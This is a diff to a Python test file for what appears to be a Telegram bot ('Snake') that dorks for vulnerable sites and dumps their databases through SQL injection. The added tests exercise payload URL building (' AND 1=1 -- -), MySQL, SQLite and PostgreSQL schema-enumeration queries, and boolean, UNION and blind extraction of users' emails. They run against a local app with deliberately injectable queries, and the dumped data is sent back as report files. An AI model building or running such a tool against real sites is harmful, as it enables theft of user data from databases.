@@ -7,6 +7,7 @@ Chalane ka tarika:
 Har test ke saath ✅/❌ print hota hai, end me total count.
 """
 import asyncio
+import atexit
 import os
 import re
 import sys
@@ -49,7 +50,7 @@ async def call(coro):
 # ══════════════════════════════════════════════════════════════════════════════
 def test_meta():
     group("meta")
-    eq(core.VERSION, "v2.9.4", "VERSION")
+    eq(core.VERSION, "v2.9.5", "VERSION")
     eq(core.ADMIN_IDS, [8999053405], "ADMIN_IDS")
     ok("SNAKE" in core.BRAND.upper(), "brand")
     ok(core.DORK_MAX >= 100000, "DORK_MAX")
@@ -464,10 +465,10 @@ def test_single_file():
     contains(stxt, "bot.py")
     with open(bot, encoding="utf-8") as f:
         btxt = f.read()
-    contains(btxt, 'VERSION = "v2.9.4"')
+    contains(btxt, 'VERSION = "v2.9.5"')
     # shim jo module load karta hai = bot.py hi
     eq(core.__file__.endswith("snake_core.py"), True, "module = shim")
-    eq(core.VERSION, "v2.9.4", "shim se version")
+    eq(core.VERSION, "v2.9.5", "shim se version")
 
 
 def test_diagnostics():
@@ -1052,8 +1053,11 @@ def test_injector_engine():
     # dumper card
     dst = {"urls": 8, "done": 2, "records": [], "errors": 0,
            "start": core.time.time() - 2}
-    dcard = core._dump_progress_card(dst, 1)
-    for needle in ("Pages", "Extracted", "Speed", "ETA", "["):
+    dst2 = {"urls": 4, "done": 1, "results": [], "rows": 7, "tables": 2,
+            "injectable": 1, "start": core.time.time() - 2, "stage": "rows",
+            "stage_info": "users (2)"}
+    dcard = core._dump_progress_card(dst2, 1)
+    for needle in ("Injectable", "Tables", "Rows", "Stage", "URLs", "["):
         contains(dcard, needle)
     ok(any(sp in dcard for sp in core.DUMP_SPIN), "dump spinner")
 
@@ -1240,6 +1244,83 @@ def test_injector_flow():
 
 def test_dumper_flow():
     group("dumper-flow")
+    real_dump, real_save, real_send = core.sqli_dump, core.sqli_save, core.send_file
+    sent = []
+
+    async def fake_sqli_dump(urls, targets=None, caps=None, timeout=8.0, conc=3,
+                             progress=None, uid=None):
+        res = {"url": urls[0], "param": "id", "ok": True, "status": "injectable",
+               "dbms": "MySQL", "tech": "boolean + UNION (column 2 printed)",
+               "db": "shop", "dbs": ["shop", "information_schema"],
+               "tables": {"users": {"cols": ["id", "email"],
+                                    "rows": [["1", "a@x.com"]], "truncated": False}},
+               "notes": [], "rows": 1, "requests": 24, "took": 1.2, "why": ""}
+        st = {"urls": len(urls), "done": len(urls), "results": [res], "rows": 1,
+              "tables": 1, "injectable": 1, "start": core.time.time() - 1,
+              "stage": "rows", "stage_info": "users (1)", "stopped": 0, "took": 1.2}
+        if progress:
+            await progress(st)
+        return st
+
+    def fake_save(st):
+        return {"files": ["/tmp/sqldump_x.txt"], "zip": "/tmp/sqldump_x.zip",
+                "csv": "/tmp/sqldump_x.csv", "rows": 1}
+
+    async def fake_send(update, path, caption=""):
+        sent.append(path)
+        return True
+
+    core.sqli_dump, core.sqli_save, core.send_file = fake_sqli_dump, fake_save, fake_send
+    try:
+        ctx = FakeContext({"last_urls": ["https://shop.example/item.php?id=1"]})
+        upd = FakeUpdate(data="df:last")
+        asyncio.run(core.cb_dump_use(upd, ctx, "last"))
+        body = "\n".join(upd.texts())
+        contains(body, "Tables")
+        contains(body, "Rows")
+        contains(body, "injectable")
+        contains(body, "shop.example")
+        ok("/tmp/sqldump_x.txt" in sent, "report file sent")
+        ok("/tmp/sqldump_x.zip" in sent, "zip sent")
+        ok("/tmp/sqldump_x.csv" in sent, "csv sent")
+
+        # vulnerable-urls shortcut param bhejta hai
+        got = {}
+
+        async def fake2(urls, targets=None, caps=None, timeout=8.0, conc=3,
+                        progress=None, uid=None):
+            got["targets"] = targets
+            return {"urls": len(urls), "done": len(urls), "results": [], "rows": 0,
+                    "tables": 0, "injectable": 0, "start": core.time.time(),
+                    "stage": "-", "stage_info": "", "stopped": 0, "took": 0.1}
+
+        core.sqli_dump = fake2
+        ctx2 = FakeContext({"last_vulns": [{"base": "https://v.example/p.php?id=2",
+                                            "url": "https://v.example/p.php?id=2%27",
+                                            "param": "id", "type": "SQLi"}]})
+        upd2 = FakeUpdate(data="df:vuln")
+        asyncio.run(core.cb_dump_use(upd2, ctx2, "vuln"))
+        eq(got["targets"], {"https://v.example/p.php?id=2": "id"}, "target param")
+        contains("\n".join(upd2.texts()), "No injectable URL found")
+
+        # text input → dump
+        ctx3 = FakeContext({})
+        upd3 = FakeUpdate(text="https://a.example/x.php?id=1")
+        asyncio.run(core.input_dump_urls(upd3, ctx3, upd3.message.text))
+        ok(upd3.texts(), "dump text input se chala")
+
+        # koi URL nahi → dobara maango
+        ctx4 = FakeContext({})
+        upd4 = FakeUpdate(text="hello")
+        asyncio.run(core.input_dump_urls(upd4, ctx4, "hello"))
+        contains("\n".join(upd4.texts()), "No URLs found")
+        eq(ctx4.user_data.get("await"), "dump_urls", "URLs dobara maange")
+    finally:
+        core.sqli_dump, core.sqli_save, core.send_file = real_dump, real_save, real_send
+
+
+def test_harvest_flow():
+    group("harvest-flow")
     real_h, real_send = core.dump_harvest, core.send_file
     sent = []
 
@@ -1261,15 +1342,165 @@ def test_dumper_flow():
 
     core.dump_harvest, core.send_file = fake_harvest, fake_send
     try:
-        ctx = FakeContext({"last_urls": ["https://shop.example/item.php?id=1"]})
-        upd = FakeUpdate(data="df:last")
-        asyncio.run(core.cb_dump_use(upd, ctx, "last"))
+        ctx = FakeContext({})
+        upd = FakeUpdate(text="https://shop.example/item.php?id=1")
+        asyncio.run(core.input_harvest_urls(upd, ctx, upd.message.text))
         body = "\n".join(upd.texts())
-        contains(body, "Pages")
         contains(body, "Endpoints")
         contains(body, "Shop")
     finally:
         core.dump_harvest, core.send_file = real_h, real_send
+
+
+def test_sqli_engine():
+    group("sqli-engine")
+    # URL builder — asli value ke aage suffix (replace nahi)
+    u = core._sqli_url("https://a.com/x?id=5&name=bob", "id", "' AND 1=1 -- -")
+    ok(u.startswith("https://a.com/x?"), "sqli url base")
+    ok("name=bob" in u, "sqli url other param safe")
+    ok("%275+AND+1%3D1" in u or "5%27+AND" in u, "sqli url append: %s" % u)
+    u2 = core._sqli_url("https://a.com/x?id=5", "id", " AND 1=2")
+    ok("id=5+AND+1%3D2" in u2, "sqli numeric append: %s" % u2)
+
+    # diff / split
+    eq(core._sqli_diff("<html>abc</html>", "<html>abc</html>"), 0, "diff same")
+    ok(core._sqli_diff("<html>abc</html>", "<html>xyz</html>") > 0, "diff different")
+    eq(core._sqli_split("a<br>b<br>c"), ["a", "b", "c"], "split sep")
+
+    # dialect SQL
+    my = core.sqli_sql("MySQL", "tables")
+    contains(my, "information_schema.tables")
+    contains(my, "DATABASE()")
+    lite = core.sqli_sql("SQLite", "tables")
+    contains(lite, "sqlite_master")
+    pg = core.sqli_sql("PostgreSQL", "dbs")
+    contains(pg, "STRING_AGG")
+    cols = core.sqli_sql("MySQL", "columns", table="users")
+    contains(cols, "0x" + "users".encode().hex(), "mysql hex table")
+    row = core.sqli_sql("MySQL", "row", table="users", cols=["id", "name"], offset=2)
+    contains(row, "CONCAT_WS") if "CONCAT_WS" in row else contains(row, "IFNULL")
+    contains(row, "LIMIT 2,1")
+    lrow = core.sqli_sql("SQLite", "row", table="users", cols=["id", "name"], offset=1)
+    contains(lrow, "IFNULL(CAST")
+    contains(lrow, "LIMIT 1,1")
+
+    # caps + report
+    caps = core._sqli_caps()
+    for k in ("tables", "rows", "blind", "requests"):
+        ok(k in caps, "caps %s" % k)
+    res = {"url": "https://a.com/x?id=1", "param": "id", "ok": True,
+           "status": "injectable", "dbms": "MySQL", "tech": "boolean + UNION",
+           "quote": "'", "comment": "-- -", "db": "shop",
+           "dbs": ["shop", "mysql"],
+           "tables": {"users": {"cols": ["id", "email"],
+                                "rows": [["1", "a@x.com"]], "truncated": True}},
+           "notes": ["page does not print query output"], "rows": 1, "requests": 30,
+           "took": 2.5, "why": ""}
+    txt = "\n".join(core.sqli_report_text(res))
+    for needle in ("PARAM", "DBMS", "MySQL", "DATABASES (2)", "TABLE users",
+                   "COLUMNS (2)", "1 | a@x.com", "use /batch"):
+        contains(txt, needle)
+    contains(txt, "page does not print query output")
+    ok("<b>" not in txt, "report plain text")
+
+
+def _run_with_sqli_app(fn):
+    """Ek hi event loop me local vulnerable app + dump — warna server band ho jata hai."""
+    async def main():
+        runner, base = await _start_sqli_app()
+        try:
+            return await fn(base)
+        finally:
+            await runner.cleanup()
+    return asyncio.run(main())
+
+
+async def _start_sqli_app():
+    import sqlite3
+    from aiohttp import web
+    db = sqlite3.connect(":memory:", check_same_thread=False)
+    db.executescript(
+        "CREATE TABLE users(id INTEGER PRIMARY KEY, name TEXT, email TEXT);"
+        "INSERT INTO users VALUES (1,'alice','alice@example.com'),"
+        "(2,'bob','bob@example.com');"
+        "CREATE TABLE orders(id INTEGER PRIMARY KEY, total REAL);"
+        "INSERT INTO orders VALUES (1,9.99),(2,4.50);")
+
+    async def v(req):
+        sql = "SELECT id,name,email FROM users WHERE id = %s" % req.query.get("id", "1")
+        try:
+            rows = db.execute(sql).fetchall()
+        except Exception as e:
+            return web.Response(status=500,
+                                text="<html>sqlite3.OperationalError: %s</html>" % e,
+                                content_type="text/html")
+        body = "<html><body><table>" + "".join(
+            "<tr>" + "".join("<td>%s</td>" % x for x in row) + "</tr>" for row in rows)
+        return web.Response(text=body + "</table></body></html>",
+                            content_type="text/html")
+
+    async def blind(req):
+        sql = "SELECT COUNT(*) FROM users WHERE id = %s" % req.query.get("id", "1")
+        try:
+            n = db.execute(sql).fetchone()[0]
+        except Exception as e:
+            return web.Response(status=500,
+                                text="<html>sqlite3.OperationalError: %s</html>" % e,
+                                content_type="text/html")
+        return web.Response(text="<html><body><p>Results found: %d</p></body></html>" % n,
+                            content_type="text/html")
+
+    app = web.Application()
+    app.add_routes([web.get("/v.php", v), web.get("/blind.php", blind)])
+    runner = web.AppRunner(app, access_log=None)
+    await runner.setup()
+    site = web.TCPSite(runner, "127.0.0.1", 0)
+    await site.start()
+    port = site._server.sockets[0].getsockname()[1]
+    return runner, "http://127.0.0.1:%d" % port
+
+
+def test_sqli_live_union():
+    """ASLI local vulnerable app (sqlite) — union se poora data nikalta hai."""
+    group("sqli-live-union")
+
+    async def body(base):
+        conn = core.mk_connector()
+        async with core.aiohttp.ClientSession(connector=conn) as sess:
+            return await core.sqli_dump_one(sess, base + "/v.php?id=1", "",
+                                            {"tables": 4, "rows": 3, "blind": 1,
+                                             "blind_len": 20, "requests": 400}, 5.0)
+
+    res = _run_with_sqli_app(body)
+    eq(res["status"], "injectable", "live status")
+    eq(res["dbms"], "SQLite", "live dbms")
+    ok(res["param"] == "id", "live param auto-detect")
+    ok("users" in res["tables"] and "orders" in res["tables"],
+       "live tables: %s" % list(res["tables"]))
+    users = res["tables"].get("users") or {}
+    ok("email" in (users.get("cols") or []), "live columns")
+    flat = " ".join(" ".join(map(str, r)) for r in users.get("rows") or [])
+    contains(flat, "alice@example.com")
+    ok(res["requests"] > 5, "live requests counted")
+
+
+def test_sqli_live_blind():
+    """ASLI blind app — page sirf count dikhata hai, phir bhi tables/cols nikalte hain."""
+    group("sqli-live-blind")
+
+    async def body(base):
+        conn = core.mk_connector()
+        async with core.aiohttp.ClientSession(connector=conn) as sess:
+            return await core.sqli_dump_one(sess, base + "/blind.php?id=1", "",
+                                            {"tables": 2, "rows": 0, "blind": 1,
+                                             "blind_len": 20, "blind_tables_len": 40,
+                                             "blind_cols_len": 40, "requests": 900}, 5.0)
+
+    res = _run_with_sqli_app(body)
+    eq(res["status"], "injectable", "blind status")
+    ok("blind" in (res["tech"] or ""), "blind technique: %s" % res["tech"])
+    ok("users" in res["tables"], "blind tables: %s" % list(res["tables"]))
+    ok("email" in (res["tables"].get("users") or {}).get("cols", []), "blind columns")
 
 
 def main():
@@ -1286,7 +1517,8 @@ def main():
                test_proxy_hidden_from_users, test_rotating_proxy,
                test_dns_helpers, test_rot_test_card, test_injector_engine,
                test_dumper_engine, test_injector_live,
-               test_injector_flow, test_dumper_flow):
+               test_injector_flow, test_dumper_flow, test_harvest_flow,
+               test_sqli_engine, test_sqli_live_union, test_sqli_live_blind):
         try:
             fn()
         except Exception as exc:
